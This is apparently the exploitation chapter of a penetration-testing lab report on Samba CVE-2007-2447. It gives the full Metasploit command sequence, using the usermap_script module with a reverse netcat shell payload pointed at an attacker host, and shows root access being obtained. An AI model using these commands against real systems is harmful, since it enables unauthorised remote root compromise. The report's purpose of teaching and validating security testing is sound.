## Exploitation
# Overview

Exploitation is the phase of penetration testing where identified vulnerabilities are actively abused to determine their real-world impact. Unlike vulnerability scanning and enumeration, exploitation goes beyond detection and demonstrates whether an attacker can gain unauthorized access to the target system.

The goal of exploitation is not damage, but validation. Successful exploitation confirms that a vulnerability is exploitable and highlights the severity of the risk in practical terms.

In this project, exploitation was performed in a controlled lab environment using the Metasploit Framework.

# Objectives of the Exploitation Phase

The primary objectives were:

Validate vulnerabilities identified during scanning

Achieve unauthorized access to the target system

Determine the privilege level obtained

Assess the security impact of the exploited vulnerability

# Tool Used for Exploitation

Metasploit Framework

Metasploit provides a structured platform for selecting exploits, configuring payloads, and managing sessions.

# Identified Exploitable Service

Based on scanning and enumeration, the following vulnerable service was identified:

| Component     | Details                          |
| ------------- | -------------------------------- |
| Service       | Samba                            |
| Port          | 139 / 445                        |
| Vulnerability | usermap_script Command Execution |
| CVE           | CVE-2007-2447                    |
| Severity      | Critical                         |

This vulnerability exists due to improper input validation in the Samba usermap script functionality, allowing arbitrary command execution.

# Exploit Selection

The following Metasploit module was selected:

exploit/multi/samba/usermap_script

This module exploits a known command execution vulnerability in Samba and allows attackers to execute arbitrary commands with root privileges.

# Exploit Configuration
# Commands Used
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.56.102
set LPORT 4444
exploit

# Configuration Explanation

RHOSTS: Target system IP address

PAYLOAD: Reverse shell payload to establish remote access

LHOST: Attacker machine IP

LPORT: Listening port for reverse connection

Proper configuration of these parameters is critical for successful exploitation.

Exploitation Result

Upon executing the exploit, Metasploit successfully established a reverse shell connection.

# Output Observed
Command shell session opened

# Privilege verification:

whoami

# Output:

root

# Impact Analysis

Successful exploitation resulted in:

Remote command execution

Root-level access to the system

Complete compromise of the target host

An attacker with this level of access can:

Read, modify, or delete sensitive files

Install persistence mechanisms

Pivot to other systems on the network

Disrupt services and operations

# Validation of Exploitation

The exploitation was validated by:

Confirming active shell session

Verifying privilege level

Executing system commands

Maintaining stable access

No destructive actions were performed during testing.

# Ethical Considerations

Exploitation was conducted:

In a controlled lab environment

With explicit permission

Without persistence or data destruction

Following responsible disclosure practices

# Outcome of Exploitation Phase

The exploitation phase successfully:

Validated a critical vulnerability

Demonstrated real-world attack impact

Confirmed root-level system compromise

Provided strong evidence for remediation urgency

These results justify the critical severity assigned during vulnerability assessment and emphasize the importance of timely patching and service hardening.
